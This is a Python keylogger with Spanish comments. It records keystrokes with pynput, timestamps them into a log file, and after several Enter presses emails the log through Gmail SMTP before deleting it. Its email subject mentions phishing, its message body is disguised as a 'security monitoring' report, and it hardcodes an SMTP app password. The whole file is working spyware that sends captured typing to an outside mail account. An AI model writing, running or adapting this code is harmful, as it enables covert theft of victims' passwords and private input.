import os
import sys
import time
import smtplib
import ssl
import certifi 
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener

# Configuración global de archivos y credenciales
ARCHIVO_REGISTRO = "registro_actividad.txt"


def enviar_correo_con_adjunto():
    """
    esta funcion se va a encargar de autenticar con el servidor SMTP de Gmail, estructurar
    un correo electrónico en formato HTML, adjuntar el archivo de registro
    y realizar el envío.
    """
    usuario_smtp = "tucorreoaca@gmail.com"
    contrasena_smtp = "rkez cfpm gnhn aceh"
    destinatario = "tucontraseñaaca@gmail.com"
    asunto = "Reporte de Auditoría de Teclado por medio de Phishing"

    # creamos la estrucura del mensaje
    mensaje = MIMEMultipart()
    mensaje["Subject"] = asunto
    mensaje["From"] = usuario_smtp
    mensaje["To"] = destinatario

    # Cuerpo del correo a enviar
    contenido_html = f"""
    <html>
    <body>
        <p> Administrador,</p>
        <p>Por medio del presente, se adjunta el reporte automatizado correspondiente a la actividad registrada en el sistema.</p>
        <br>
        <p>Atte,<br><b>Sistema de Monitoreo de Seguridad</b></p>
    </body>
    </html>
    """
    
    # adjuntamos el contenido de texto HTML
    parte_html = MIMEText(contenido_html, "html")
    mensaje.attach(parte_html)

    # Procesamiento y adjunto del archivo log
    try:
        with open(ARCHIVO_REGISTRO, "rb") as adjunto:
            contenido_adjunto = MIMEBase("application", "octet-stream")
            contenido_adjunto.set_payload(adjunto.read())
            
        encoders.encode_base64(contenido_adjunto)
        contenido_adjunto.add_header(
            "Content-Disposition", 
            f"attachment; filename={ARCHIVO_REGISTRO}"
        )
        mensaje.attach(contenido_adjunto)
        
        # convertimos el mensaje a una cadena de texto
        mensaje_final = mensaje.as_string()

        # conexión segura y enviarlo
        contexto_seguridad = ssl.create_default_context(cafile=certifi.where()) 
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=contexto_seguridad) as servidor:
            servidor.login(usuario_smtp, contrasena_smtp)
            print("[INFO] Autenticación exitosa en el servidor SMTP.")
            servidor.sendmail(usuario_smtp, destinatario, mensaje_final)
            print("[INFO] Reporte enviado formalmente por correo electrónico.")
            
    except FileNotFoundError:
        print(f"[ERROR] No se encontró el archivo '{ARCHIVO_REGISTRO}' para adjuntar.")
    except Exception as error:
        print(f"[ERROR] Ocurrió un fallo durante el envío de correo: {error}")


class RegistradorTeclas:
    """
    Clase encargada de encapsular el estado del keylogger, procesar las
    pulsaciones de teclas y coordinar la escritura y el envío de reportes.
    """
    def __init__(self):
        self.lista_teclas = []
        self.conteo_envios = 0

    def guardar_en_archivo(self):
        """
        Escribe las teclas almacenadas en el archivo de registro físico,
        añadiendo una marca de tiempo detallada (Fecha y Hora).
        """
        with open(ARCHIVO_REGISTRO, "a") as archivo:
            # Formato de fecha (DD/MM/AA) y hora (HH:MM:SS)
            archivo.write(time.strftime("%d/%m/%y "))
            archivo.write(time.strftime("%I:%M:%S "))
            
            for tecla in self.lista_teclas:
                tecla_limpia = str(tecla).replace("'", "")
                
                # Si es un salto de línea, se escribe directamente
                if tecla_limpia.find("\n") > 0:
                    archivo.write(tecla_limpia)
                # Si no es una tecla especial del sistema, se registra
                elif tecla_limpia.find("Key") == -1:
                    archivo.write(tecla_limpia)
                    
        print(f"[LOG] Datos almacenados en '{ARCHIVO_REGISTRO}'.")

    def registrar_pulsacion(self, tecla):
        """
        Evalúa de manera lógica cada tecla presionada, gestiona caracteres 
        especiales y determina cuándo se debe enviar el archivo por correo.
        """
        if tecla == Key.enter:
            self.lista_teclas.append("\n")
            self.guardar_en_archivo()
            self.lista_teclas = []  # Limpiar lista temporal tras guardar
            self.conteo_envios += 1
            
            # al superar el límite establecido, envía el reporte
            if self.conteo_envios > 5:
                enviar_correo_con_adjunto()
                if os.path.exists(ARCHIVO_REGISTRO):
                    os.remove(ARCHIVO_REGISTRO)
                    print(f"[INFO] Archivo temporal '{ARCHIVO_REGISTRO}' purgado.")
                self.conteo_envios = 0
                
        elif tecla == '"' or tecla == Key.shift_r:
            self.lista_teclas.append('"')
            
        elif tecla == Key.ctrl_l:
            pass  # Exclusión explícita de la tecla Control Izquierdo
            
        elif tecla == Key.backspace:
            if len(self.lista_teclas) > 0:
                self.lista_teclas.pop(-1)
                
        else:
            self.lista_teclas.append(tecla)
            
        print(f"[DEBUG] Tecla detectada: {tecla}")

    def registrar_liberacion(self, tecla):
        """
        Detecta la liberación de teclas. Detiene el proceso general
        únicamente si se presiona la tecla Escape (ESC).
        """
        if tecla == Key.esc:
            print("[INFO] Deteniendo el servicio de registro de actividad por solicitud del usuario.")
            return False


def ejecutar_aplicacion():
    """
    Función principal que inicializa el entorno de ejecución, remueve registros
    antiguos e inicia el Escuchador (Listener) del teclado.
    """
    print("[SISTEMA] Inicializando servicio de auditoría...")
    
    # Limpieza inicial del entorno
    if os.path.exists(ARCHIVO_REGISTRO):
        os.remove(ARCHIVO_REGISTRO)
        
    instancia_registrador = RegistradorTeclas()

    # Inicialización del escuchador utilizando el manejador de contexto
    with Listener(
        on_press=instancia_registrador.registrar_pulsacion, 
        on_release=instancia_registrador.registrar_liberacion
    ) as escucha:
        escucha.join()


if __name__ == '__main__':
    ejecutar_aplicacion()
